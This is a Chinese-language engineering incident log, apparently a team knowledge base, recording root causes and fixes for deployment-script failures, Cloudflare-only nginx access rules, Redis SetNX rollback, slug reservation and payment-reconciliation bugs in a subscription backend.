- **解决**：`/www/server/nginx/conf/cloudflare-only.conf`（`allow 127.0.0.1;::1; + CF IPv4 15段; deny all;`，**不放 `*.conf` 通配目录**以免误伤宝塔面板 8889），在两个**手动**反代 vhost（`api-443-to-origin`、`wildcard`，宝塔不管、无覆盖风险）的 server 块注入 `include`。脚本备份 + `nginx -t` + 失败自动回滚（备份 `/root/nginx-8a-backup-20260717-192209`）。**三角验证**：Mac 经 CF→200、Mac 直连源站绕 CF→**403**、本机→200；api/www 域名经 CF 均 200（回调不受影响）。
- **坑点**：① **不能同时配 nginx real_ip + allow CF**——real_ip 会把 `$remote_addr` 换成真实客户端 IP、allow CF 段就失效；故 8a 只 allow/deny（基于原始对端=CF 出口 IP），真实 IP 由 gin 从 CF 头取。② 审计原 snippet 的 `SetTrustedProxies([127.0.0.1])` 在此拓扑会把全站归一成 CF 出口 IP → 大面积误封（见上条），故 part① 用权威头、8a 用 allow/deny，两者配合而非替代。③ 宝塔环境：include 文件放 nginx 主 conf 目录（非 vhost 通配目录）+ 只改手动 vhost，避开宝塔覆盖与面板误伤。
- **升级**：候选规则——「CF 前置的源站，`gin.TrustedPlatform=CF-Connecting-IP`（读真实 IP）**必须**配 nginx/防火墙层的 `allow CF段 + deny all`（防绕 CF 伪造该头），两者缺一不可；且二者都基于 CF **回源** IP 段（非客户端段），源站无 IPv6 则只需 CF IPv4 段」。仅剩 CF 面板侧 SSL=Full(strict) 待用户设。参见 [[client-ip-trust-and-per-user-money-limit]]。

### [已解决] 一次部署连踩三坑：macOS bash3.2 中文 locale 崩 + C1 密钥最后一公里缺失 + Go 死码孤儿——均已根治（2026-07-17）
- **现象**：限流安全修复上线，`deploy.sh` 连续失败，三个**不同根因**逐个暴露（每个都在更靠后的阶段）。
- **根因与根治**：
  1. **locale（步骤 5 崩）**：macOS 自带 **bash 3.2** 在 UTF-8 locale 下把「`$VAR` 后紧跟的中文多字节字符」首字节并入变量名 → `set -u` 报 `unbound`（line106 `$SERVER_REPO（并归档…`）。实测 **`en_US.UTF-8` 也救不了**（bash 3.2 多字节解析本身有 bug），**`LC_ALL=C` 反而正确**（按单字节处理、高位字节非标识符 → 变量名正确终止；中文 log 字节透传照常显示）。`run_in_background` 后台 shell 尤其不继承交互 locale。**根治**：`deploy.sh` 顶部 `export LC_ALL=C LANG=C`。
  2. **C1 密钥最后一公里（构建前 compose 插值崩）**：compose 已改 `${SESSION_SECRET:?}` fail-closed（C1），但服务器 `.env` **从没补随机密钥** → 自 C1 提交后**没成功重构建过**（线上 `version=""` 印证跑老镜像）、且线上一直用**泄露在 git 的老 SESSION_SECRET**。**根治**：服务器 `.env` 补 `openssl rand -hex 32` 两把（SESSION≠CRYPTO 分权），用户确认代价=全站登出一次；C1 真正闭合（`common/crypto.go` 用 CryptoSecret 做 **HMAC**、非加密存储 → 轮换无数据损坏）。
  3. **Go 死码孤儿（go build 崩）**：`deploy.sh` 的 `tar` **只覆盖不删**，C7 死码清理删的 `internal/relay|identity|billing` 整目录 + `wallet/stats` 层在服务器**残留孤儿** → 服务器 `go build` 引用已删符号失败（**本地 build 通过=树干净，服务器有孤儿=不一致**，最隐蔽）。**根治**：`deploy.sh` 把 `internal/` 纳入 delete-sync（`rm -rf` 后 `tar` 完整解包）。
- **升级**：候选规则——① 含中文的 bash 脚本强制 `LC_ALL=C`（或变量全用 `${VAR}` 花括号）；② **fail-closed 密钥护栏（`:?`）落地时必须同步在服务器 `.env` 生成真值**，否则下次构建才暴露、期间一直跑泄露值（护栏只挡"新部署"、挡不住"一直没重部署"）；③ tar-over-ssh 部署对**所有会删文件的源码目录**做 delete-sync（`deploy.sh` 步骤 8 的镜像 ID 校验只能**发现**假成功、**防不了**孤儿构建失败）。三条均已在 `deploy.sh`/流程固化（本次 3 个 commit）。参见 [[deploy-scope-parallel-wip]]、[[deploy-latest-tag-stale-containerd-attestation]]、[[local-no-build-toolchain]]。

### [已解决] Trial 三维 SetNX 决胜的败者残留：判负/报错时前序已占维度键永久写死（TTL=0）→ 无辜用户终身失去 Trial 资格（audit 2026-07-17 发现#3+#4 High · 本批真回归）
- **现象**：`checkTrialLimit` 重构（Get 预检 → 逐维 SetNX 决胜）修好了并发单赢家，却引入**边查边写无回滚**：循环序 [userK, realK, devK]，在第 2/3 维判负时前面维度已写入，且 Trial `PurchaseDedupTTL=0` 即永久。家用共享设备场景：A 领到 Trial 后家人 B 同设备尝试被拒 → userK:B 已永久写死 → B 换干净设备也被永久拒（从未买到过却报「超过限购次数」）；实名维度更狠——realK 按自然人计，被污染后该自然人**所有账号所有设备**终身失格。engine.go 注释「残留只限自身用户维度」「单一身份正常用户永不误封」两句均被审计差分探针证伪。同根因第二触发路径（发现#4，影响更荒谬）：中途维度 SetNX 遇 **Redis 瞬时错误**——旧码对 realK/devK 用 `_, _ =` 丢弃错误（抖动时照样发放 Trial），新码如实传播错误（此点是改进）但无回滚 → SetNX(userK) 成功、realK 抖动报错、HTTP 500、订单从未创建，5 秒后 Redis 恢复重试即永久 `PURCHASE_LIMIT_EXCEEDED`——一次 1 秒抖动永久吊销当时全部结账中用户的资格，零订单零付款零自助恢复，比旧码更坏。
- **根因**：把「零写入预检」换成「写入即检查」时没配补偿删除。注释断言「KVCache 无删除原语、无法补偿删除」与**同文件** `ReleaseTrialLimit` 在用的 `Del` 自相矛盾（Del 系 C4 同批补齐，重构未跟进用于败者回滚）——注释写下时的前提已失效，代码与断言脱节。
- **解决（TDD 红→绿）**：循环内维护 `acquired` 切片，判负/报错即 `Del(acquired...)`——只回滚本次真正 SetNX 成功的键、绝不碰既得赢家的键 → 单赢家性质不变（最后一个非空维度持有者恒胜出），最坏情况从「永久烧毁」降为「并发同侪一次瞬时且自愈的误拒」。4 个回归测试钉死：败者 userK 不留痕＋赢家键不被误删＋换设备放行；realK 不被污染＋自然人换账号换设备放行；中途报错同样回滚（错误照旧传播）；一次性抖动（第 2 次 SetNX 报错一次）恢复后同身份重试成功（PROBE-P6，已用 stash 掉修复对 HEAD 验红——重试确报永久超限——修复后转绿）。本机全门禁绿（build / vet 零输出 / internal+model+router 全测 / risk 包 -race）。既有 `TrialSetNXErrorPropagates` 用 `context.Background()` 无身份 → 只写一维，部分写入路径此前从未被测过（审计指认属实）。
- **坑点**：① 测试必须加「赢家键仍在」断言——否则「无条件删三键」的错误实现也能骗过「败者不留痕」断言（实际会误删赢家键、放第二人进来）；② 回滚 Del 本身失败（Redis 抖动）时残留仍可能出现，兜底走既有 `ReleaseTrialLimit` 后台释放通道（C4）；③ 同文件注释与实现能力脱节是本条帮凶——改公共原语（如补 Del）后应 grep 同包注释里的「无 X 原语」类断言。
- **升级**：候选规则——「多键 SetNX 决胜（先写后判）必须带 acquired 回滚，且只删本次占到的键」；与 C4（不可逆键需释放原语＋释放通道）同族。暂不占号。

### [已解决] AGT slug 预检是无预留的 check-then-act：两买家可同 slug 双双扣款仅一人激活 + 域名口径从未预检——预留式闭合（audit 2026-07-17 发现#5 High）
- **现象**：`precheckAgentPurchaseSlug` 位置对（下单收钱前）但只 Count `tenants.slug`，而激活要同时过 `tenants.slug` 与 `tenant_domains.domain` **两个唯一索引**，且预检→激活之间无任何预留、窗口=买家整个付款会话（数分钟）。三条路径证伪「预检通过⇒激活必成」：(a) 两买家先后预检同一 slug → 都下单都扣款（¥9990）→ 激活单赢家，败者订单永停 pending、对账每 5 分钟重试到天荒地老；(b) 管理员 `AddSubdomain` 把任意 label 域名指给别的租户（slug 与域名解耦）→ 预检放行收款 → 激活 `Create` 先插 tenants 行成功、再插 domain 行撞键失败 → **未归属孤儿 tenants 行留下**（SetOwnerUserID 根本没跑到），重试改撞 tenants.slug（毒丸，发现#6）；(c) 仅影响 GrantLevel≥1 档＝恰好 ¥2999–9990 的贵 SKU。
- **根因**：把「查重」当成了「预留」。Count 是快照，不占任何东西；唯一索引才是权威仲裁者，但它在钱**离账之后**才第一次被咨询。
- **解决（预留式，TDD 5 红→5 绿）**：① 预检改 `precheckAndReserveAgentSlug`——全新代理成功预检即**插入软删态（status=deleted）tenants 占位行**（owner=买家、归一化 slug、TokenplanEnabled），`idx_tenants_slug` 在钱动之前仲裁，并发同 slug 第二人 INSERT 撞索引 → 付款前 409；订单落 `agent_tenant_id=预留行id` 作锚。② 预检查重补 `tenant_domains.domain` 口径（对齐激活 CreateDomain，闭合触发(b)确定性case）。③ 激活走**既有 revive 分支**翻 active，但 revive 前补幂等完整开通（`EnsureWallet` + `users.tenant_id=0` 归位）——revive 分支此前只服务「曾完整开通过的旧站」，预留行直走会产出**无钱包代理**（审计方案没提的坑）。④ 未付款订单对账过期（`expireStuckAgentPlanOrder` CAS 赢家）→ `releaseAgentSlugReservation` 释放：单条原子 DELETE 带双守卫（`status='deleted'` 已激活不删 + `NOT EXISTS pending 单引用` 兄弟单仍 pending 不删），弃单重试（O1 过期、O2 pending 同锚）不致「提前释放→他人抢注→O2 已付撞键」；订单没落地的孤儿预留当场补偿释放（对齐 #3 的 acquired 回滚模式）。
- **坑点（与审计字面建议的刻意分歧）**：① 审计写 `status=pending_payment`，但其指定机制「经既有 revive 分支翻活」的查询（`agentDeletedTenantByOwner`）**只认 deleted**——两者自相矛盾；且新状态要重审 ≥8 处按状态过滤的查询，最险的 `gormrepo.TenantByOwner`（`<> deleted AND <> suspended`）会给未付款预留发 RoleAgentOwner 代理鉴权。**预留行用 status=deleted**：与线上既有软删租户形状完全一致（不解析 Host、不参与 owner 鉴权、不算在营代理），零新增泄漏面。② 释放**只准以订单 agent_tenant_id 锚点**、绝不按 owner 反查删——防误删真实软删旧站（其下有用户/钱包/配置）。③ 残余（接受并记录）：管理员在付款窗口内 `AddSubdomain` 抢占域名仍可致激活失败（预留只锁 slug 不锁域名），但行已归属买家、无毒丸、卡单页可见+告警可恢复；升级路径 `EnsureSubdomain` 把「域名被**他人**占用」也吞成幂等 nil（激活成功但站不通）系既有行为，未在本条动。④ slug 被预留后管理员建同名代理会 409 到预留过期（≤下单+2h），属正确仲裁非 bug。
- **升级**：候选规则——「任何『先校验再收钱』的资源类购买（slug/域名/号码），预检必须**以权威唯一索引做付款前预留**（check-then-act 的 Count 不算数），且预留必有释放路径（订单终态锚定）与完整开通语义」。与 C4（占用必须可释放）、C5（订单类型四层保护）同族。暂不占号。

### [已解决] AGT 新建代理分支六步非事务写 + 归属后设：中途崩溃留「无归属孤儿行」永久毒化重试——认领式自愈（audit 2026-07-17 发现#6 High）
- **现象**：`provisionAgentFromOrder` 新建分支＝六步无事务写（Create[=CreateTenant+CreateDomain 两写]→SetOwnerUserID→users.tenant_id=0→SetAgentType→EnsureWallet→membership），且 **owner 归属晚于建行**。CreateTenant 后进程被部署重建（deploy.sh `force-recreate` 是例行事件）/DB 抖动 → 留下「slug 已占、owner_user_id=0、active」孤儿行：重试的 owner 反查双查询（agentTenantByOwner / agentDeletedTenantByOwner）都看不见它、它却占着 slug → 每次重试确定性 `SLUG_DUPLICATE`，付了 ¥990–9990 的订单永久卡 pending、对账每 5 分钟忠实重试到永远。这也正是发现#5 触发(b) 的**自我毒化**机制：管理员事后移走冲突域名也救不回来。
- **根因**：非事务多步写没有崩溃恢复设计——每个中间态都必须要么可被重试**看见**（归属先行）、要么可被重试**认领**（自愈谓词）；本分支两者皆无。
- **解决（TDD 2 红 1 守卫→全绿）**：① 新建分支撞 `ErrSlugDuplicate` 时**认领**同 slug 的「owner_user_id=0 AND status=active」孤儿行续跑（各步本就幂等）；已归属他人的行**绝不认领**（真冲突保持卡单可见，负测试钉死归属不被篡改）；② 认领时 GrantLevel≥1 补 `EnsureSubdomain`——**审计修复 snippet 漏了这步**（孤儿可能崩在 CreateDomain 前，照抄=交付「付独立档钱没有站」）；③ 升级分支补幂等 `EnsureWallet`（真升级恒 no-op）——兜「认领/预留翻活后、开通完成前再崩」的半开通行（此前该分支不建钱包→重试产出无钱包代理），并把 #5 revive 块的钱包补建收敛到这一个权威点。
- **坑点**：① 发现#5 的预留式确实消掉了本条的主触发面（新单不再走新建分支：预留行 owner 在 INSERT 原子写入、revive 各步幂等），但**没有全消**——遗留 pending 单、库内历史孤儿行（永久不可售的 slug）、预留释放与迟到已付激活的竞态仍会踏进新建分支，审计「与 #5 一并消失」的预言只对了一半；② 认领谓词收紧到 `owner=0 AND active`（崩溃现场的准确形状）——`owner=0` 单独不够：unowned 行还包括主站根域/管理员半配租户，加 status 与 slug 双限定后误认领面收敛到「恰为本单派生 slug 的无主 active 行」；③ 崩溃自愈的通用检法：对每个「非事务多步写」问自己——**在任意前缀崩溃后，重试还能到达终态吗？**本条 new-agent 分支答案曾是「否」（孤儿不可见不可认领）、升级分支曾是「半否」（可见但钱包永缺）。
- **升级**：候选规则——「多步非事务开通链必须满足『任意前缀崩溃后重试可达终态』：归属/锚点写入尽量前置，撞唯一键时按精确谓词认领自家崩溃现场，每步幂等」。与 #5 预留式（仲裁前置）、#3/#4 acquired 回滚（占用可逆）同族，合称本批「check-then-act 三连修」。暂不占号。

### [已解决] AGT/SUB 对账「超26h+任何查单错误→静默终态过期」是循环论证：已付单被无声注销且零告警——终态只认网关确定性答复（audit 2026-07-17 发现#7 High）
- **现象**：AGT/SUB 对账的 err 分支 `ancient || (expired && ErrOrderNotExist)`——下单超 26h 后**任何**查单错误（超时/限流/凭据不完整 errProviderDisabled）都直接置终态 expired。辩护注释「若曾支付，前面数百轮查单必已捕获」是**循环论证**：该分支只在查单失败时进入，凭据轮换配错/渠道临时停用期间恰恰不存在成功过的查单轮。后果三连：已付 ¥9990 写成终态；`listStuck*` 只选 pending → 卡单页消失；Failed 为空 → `alertReconcileHealth` 的 `failed>0` 不成立 → Critical 告警不响。终态+不可见+不重试+无告警，唯一发现途径是人工对商户平台流水。帮凶：既有 SUB 测试 `ExpiryFallback` **明文钉死了这个错误行为**（「瞬时错误+超26h → 兜底过期」有断言盖绿章）——绿测试为错误规格背书，与 C8 的 SQLite 空锁绿章同款。
- **根因**：把「无法证实已付」当成了「证实未付」。终态判定接受了非确定性输入（查单错误），违反两文件各自文件头自述的「绝不因瞬时错误误杀已付单」。
- **解决（TDD 3 红→绿，AGT+SUB 镜像同修）**：① err 分支只保留 `expired && ErrOrderNotExist`（确定性「查无此单」+超 2h 二维码窗口）；查单失败一律 Failed——保持 pending（卡单页可见）+ 计入 failed（触发 Critical 告警）+ 下轮重扫，直到网关给出确定答复（已付→激活/确认未付→过期/查无此单→过期）；② 删除 `agtReconcileMaxAge`/`subReconcileMaxAge` 死常量与循环论证注释；③ AGT/SUB 激活侧对「已付驱动命中过期终态单」补 `common.SysError` 大声留痕（网关自相矛盾=钱已收单已终态，需人工核查；对账路径该错误同时进 Failed 告警），关掉 2h 边界迟到回调的静默竞态；④ 改正 `ExpiryFallback` 被钉死的错误预期。端到端测试：故障期（持续查单错误）已付超龄单不被杀 → 故障恢复下一轮真实激活链救回。
- **坑点**：① 刻意代价——真废单在网关持续不可查期间会一直占卡单页+重复告警（DedupKey 已防轰炸）：**可见的噪音优于无声的钱损**；凭据修复后一轮即收敛。② **RCG 同族已随后并齐修复（同日，用户指示）**：`internal/payment/reconcile.go` 原对超龄 created 单**连查单都不做**直接置 failed——形状比 AGT/SUB 更糟（后者至少查了、错了才杀）。修法同一不变量：删 maxAge 预查短路（含签名参数与 `reconcileCreatedMaxAge` 死常量）、超龄单照常查单（已付照救、错误留 Failed 可见+告警+重扫）、补 `expired && ErrOrderNotExist` 确定性过期（此前 RCG 缺此分支，网关已作废单会永留 Failed 噪音）；3 新测试先红后绿（超龄已付救回/超龄错误可重扫/查无此单超窗即清+窗口内不误杀）。③ 检法沉淀：凡「终态判定」问一句——**判据是确定性答复还是『没拿到答复』？**后者=把故障当事实。
- **升级**：候选规则——「资金订单的终态转移（expired/failed/cancelled）只准由**确定性外部答复**或**用户显式动作**驱动，严禁由『查询失败』『超龄』这类非确定性信号驱动；无法确定就保持可见+告警+重试」。与 #3/#4（错误路径不得留永久副作用）、C5（四层保护）同族。暂不占号。

### [已解决] 「假成功部署」的唯一拦阻竟是另一个 bug 的崩溃——且我们已亲手拆掉它：版本自检改阻断闸门 + 未定义 helper lint（audit 2026-07-17 发现#8 High）
- **现象**：deploy.sh 两个 bug 互相抵消——Bug A：版本自检失败分支调用只存在于服务器侧 lib.sh 的 `warn`（Mac 侧从不 source）→ `set -euo pipefail` 下运行期 exit 127 当场崩，后续 healthcheck/「部署成功」/exit 0 全不执行；Bug B：该自检被设计成「只告警不阻断」，而唯一**阻断**闸门是镜像 tag ID 比对——正是 BuildKit/containerd manifest-list 下会漂移产生假通过的原事故机制（RETRO「deploy 报成功却跑旧码」）。合起来：今天拦住「报告成功✅实跑旧码」的唯一防线是 Bug A 的崩溃。**审计预言「谁看 warn 报错碍眼顺手补上、谁就当场恢复事故」——我们在审计出报告前已经亲手干了**：`7e3e328「补 warn() 定义…本该只告警」`（07-17 18:52）只修了「调用未定义函数」这个表层症状，没问「这个告警分支为什么存在、它本来拦的是什么」——把事故防线当 bug 修掉了，此刻假成功路径完全敞开（不崩、也不拦）。
- **根因**：三重——① 自检把**最强**的端到端判据（线上二进制自报版本，不受任何镜像 ID 歧义影响）降级成弱信号，却把**最弱**的（tag ID 间接推断）留作唯一阻断；② `bash -n` 抓不到运行期未定义函数 + 本机无 shellcheck → Bug A 得以出厂；③ 修 Bug A 时的「症状修复」未追问调用点语义。
- **解决**：① 版本自检改**阻断**（不符 → 打构建尾日志 + `die`；`APP_VERSION` 含构建时间戳每次必唯一 → 旧容器续跑必不等、零误伤面）；② **删除 `warn()`**（改阻断后成死码），helper 区留注释「刻意无 warn()：部署校验只有过/不过」防再降级；③ 新增 `scripts/lint-deploy-helpers.sh`（preflight 1/7 接入）：目录词表 × 逐文件可见定义（含 source 解析）抓「调用了未定义 helper」——对历史 bug 版 deploy.sh 夹具（`7e3e328^`）精确命中 :174-175 两处 warn 并 exit 1；④ 故障注入演练（桩驱动 deploy.sh **真实**闸门代码块）：不符 → die exit≠0、「部署成功」不可达；相符 → 放行。
- **坑点**：① lint 自己差点踩 set -e——`grep -qx … && continue` 未命中时整句返回 1 被 set -e 杀死（零输出退出）：bash 里「条件 && continue」在 set -e 下是地雷，须写 if；② 审计的可选加强「断言容器镜像 ID」**刻意不做**：manifest-list 下镜像 ID 本身会漂移（正是原事故机制），版本自报才是不依赖镜像 ID 的端到端判据；③ 教训一句话：**修「调用未定义函数」前先问该调用点的语义——它可能是唯一在岗的防线**。shellcheck 仍未装（可 `brew install shellcheck` 作二道防线，本类已由 lint 覆盖）。
- **升级**：候选规则——「部署校验只有过/不过两态，禁止 warn 型闸门；『改动已上线』的判据必须端到端观测运行中制品（版本自报），不得依赖镜像 tag/ID 间接推断」。与 C6（版本可溯源/回滚可达）直接互补。暂不占号。

### [已解决] 对账 26h maxAge「查单报错也兜底终态」：辩护注释是循环论证——已付单在持久性查单故障下被静默置终态（Critical·三路径同病，AGT/SUB/RCG）
- **现象**：`ReconcileStuckAgentPlans`（agent_plan_reconcile.go:70-81）对下单超 26h 的 pending 单，在查单**任何**报错时都置终态 expired，辩护注释称「若曾被支付，前面数百轮查单/回调必已捕获激活」。但该分支只在查单**正在失败**时进入——错误可以是**持久性**的：`payment_inprocess.go:236` 凭据不全时 `QueryOrder` **每一轮必报** `errProviderDisabled`；凭据轮换配错（正是本文件头自述的动机场景）时回调验签与主动查单**同因同时**失败，「前面数百轮捕获过」恰恰没有发生——论证假定了自身触发条件所否定的前提。后果四重静默：已付 ¥990–9990 单被写死 expired 终态；`res.Failed` 为空 → `alertReconcileHealth`（只看 failed>0）不触发；`listStuckAgentPlans` 只选 pending → 卡单页消失；下轮不再扫描。运维只见一行 `reconcile AGT: … expired=N` info 日志（读起来像 N 个废弃购物车）。子代理实测：已付 ¥9990 单 + 瞬时错误 → 一轮后 status=expired、卡单页 0 行、Failed 空、永不重试。SUB（sub_reconcile.go:83）一字不差同病；RCG（payment/reconcile.go:92-98）**更重**——超 26h 连查单都不查、无条件置 failed，即使故障已恢复、一查即可救回已付单，也在跨过 26h 瞬间不经查单被终态吞掉。公允：AGT 是 SUB 的忠实复制、非回归，且净值仍优于此前「AGT 零对账」；但它被应用到了全站最贵 SKU。
- **根因**：把「年龄大」当成了「未支付」的证据。26h maxAge 的设计动机（止住网关不可达时对远古单的永久重试与告警）在**瞬时**故障下成立，在**持久性**故障（凭据配错/渠道禁用）下恰好反转——故障期间正是已付单最需要保护的窗口。终态建立在了不确定证据上。
- **解决**：确立**终态铁律：终态只允许建立在确定性证据上**——①查单成功返回「未付」且超 2h（二维码失效）→ 终态；②网关明确 `ErrOrderNotExist` 且超 2h → 终态（无论多旧）；③其余一切查单报错（瞬时或持久）→ **无论多旧**一律留 Failed：订单保持 pending（卡单页可见）+ Failed 非空（告警触发，DedupKey 防轰炸）+ 下轮重试——网关持续查不动本身就是需要告警的事故，每轮一次查单的重试成本可忽略。三路径同修：AGT/SUB 删 `ancient ||` 分支及 `agtReconcileMaxAge`/`subReconcileMaxAge` 常量；RCG 删「跳过查单直接 failed」分支、改为永远查单并补 `ErrOrderNotExist` 确定性终态（签名去掉 maxAge 参数，`reconcileCreatedMaxAge` 常量删除）。测试：翻转 SUB 测试中固化 bug 的 `SUB-transient-ancient` 用例（现在断言留 Failed + 保持 pending）；新建 `agent_plan_reconcile_test.go` 两例——全矩阵过期语义 + **复现审查场景**（¥9990 已付远古单在持久性查单故障下连扫 3 轮：轮轮 pending+Failed+卡单页可见，故障恢复后下一轮激活追回）；RCG 补 `TestReconcileStuckCreatedAncientNeverExpiredWithoutEvidence`（远古已付单必须被查单救回——旧实现会不经查单吞掉）。服务器 `golang:1.25.1` 容器 `go build ./... && go vet ./internal/... && go test ./internal/...` 全绿。
- **坑点**：修复的代价是「真死单 + 网关对其永久报错（非 not-exist）」会一直留在 Failed 里持续告警——这是**故意的**：可见的噪声优于不可见的丢钱，且此类单现在卡单页可见、可人工处置。注意 `ErrOrderNotExist` 也非绝对安全：商户号轮换后旧商户号下的已付单在新商户号查询会返回 not-exist（更深的错配，接受此边界、未扩大范围）。
- **升级**：候选规则——「**对账/风控等自动化流程把订单写入不可逆终态前，所依据的证据必须是确定性的**（平台明确答复），『查询失败 + 年龄大』不构成未付证据——错误可能与回调失败同因（凭据配错等持久性故障），此时兜底终态恰好在最需要救单的窗口杀单。凡『若曾发生 X，之前必已被捕获』式辩护，先检查该分支的触发条件是否恰好蕴含『之前的捕获也在失败』（循环论证探测）」。与 C5（每种金额订单必接全对账层）互补：C5 治「漏接对账」，本条治「对账本身误杀」。参见 [[agt-order-no-reconcile-fallback]]、[[merge-clean-but-semantically-broken]]。

### [已解决] SetNX 重构的核心性质零测试守卫：并发测试把 64 个 goroutine 全钉在同一 userID，固定的是一个从未坏过的性质——还原整个修复，测试全绿（变异实测）
- **现象**：3dd6b4f（Trial 三维去重改逐维 SetNX 决胜）存在的唯一目的，是关掉「不同账号共享设备/实名并发各领一份 Trial」的跨账号绕过；但守卫它的 `TestCheckPurchaseLimit_TrialConcurrentSingleWinner`（engine_test.go）全部 64 个 goroutine 用 **userID=7**——`userK` 本身即同一把 SetNX 锁，旧实现（仅 userK 决胜、丢弃 realname/device 维度返回值）在此场景本来就恰好 1 个赢家。变异实测：把 3dd6b4f 之前的 `checkTrialLimit` 原样还原，`go test -race ./internal/risk/...` **零失败**。任何人还原/重构这段循环即重开多账号 Trial 农场而 CI 保持全绿。
- **根因**：测试的并发主体没有覆盖修复所针对的**身份维度组合**（跨账号 + 共享单一维度）——「有并发测试」≠「并发测试踩在竞态窗口上」。
- **解决（两轮才杀掉变异）**：新增 `TestCheckPurchaseLimit_TrialConcurrentCrossAccountSingleWinner`（shared-device / shared-realname 两子例，每 goroutine 不同 userID、仅共享一个维度）。**第一轮失败**：普通并发（64 goroutine 一齐冲）对旧实现**依然全绿**——旧代码「Get 预检→SetNX 落痕」窗口在内存 KV 下极窄，单轮几乎总是 1 个赢家（与审查探针「32 并发×200 轮才逼出 max 3」一致），单发压测守不住。**第二轮改确定性交错**：`barrierGetKV` 在共享维度键的 Get 上设会合屏障，且屏障必须放在**内层 Get 完成之后**（先把 not-found 结果攥在手里再会合；放在 Get 之前时最快 goroutine 放行后先落痕、其余请求的内层 Get 仍看到占用，窗口重新闭合——第一版屏障就栽在这，probe 实测 barrierArrived=4 但 winners=1）。屏障对不调 Get 的新实现零干预（超时兜底防死锁）。变异验证闭环：旧实现 → 两子例确定性 `got 4` 红；真实实现 → 全绿（服务器 golang:1.25.1 容器 `go test -race`，含全量 risk 套件）。
- **升级**：候选规则——「**并发安全修复的守卫测试，必须先对『修复前实现』跑一遍证明它变红**（变异测试）；普通并发压测对窄竞态窗口几乎恒绿，须用注入桩把交错确定性地撑开——且同步点要放在『读到过期结果之后』而非『发起读之前』，否则窗口在放行后重新闭合」。与 [[trial-dedup-setnx-discarded-concurrent-bypass]]（并发正确性建在原子原语返回值上）配套：那条治实现，本条治「守卫实现的测试自身是否可证伪」。参见 [[native-subscription-billing-path-and-nested-tx-fix]]（假覆盖：测试数字≠真路径被测）。
